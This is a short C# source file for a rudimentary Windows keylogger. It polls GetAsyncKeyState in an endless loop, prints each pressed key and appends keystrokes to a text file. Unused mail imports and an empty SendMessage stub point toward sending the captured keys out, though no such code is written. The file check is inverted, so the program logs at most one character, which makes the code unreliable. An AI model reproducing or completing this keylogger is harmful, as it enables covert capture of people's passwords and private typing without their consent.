using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.WebSockets;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {

            // string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string fileName = ("../keyLoggerOnText.txt");

            // if (!Directory.Exists(filepath))
            // {
            //     Directory.CreateDirectory(filepath);
            // }

            while (true)
            {
                Thread.Sleep(20);

                for (int i = 32; i < 127; i++)
                {
                    int keystate = GetAsyncKeyState(i);

                    if (keystate == 32768 || keystate != 0)
                    {
                        Console.Write((char)i + ", ");

                        if (!File.Exists(fileName))
                        {
                            using (StreamWriter sw = File.AppendText(fileName))
                            {
                                sw.Write((char)i);
                            }
                        }
                    }
                }
            }
        }

        static void SendMessage()
        {

            // string folderName = Environment.GetFolderPath(Environment);
        }

    }
}
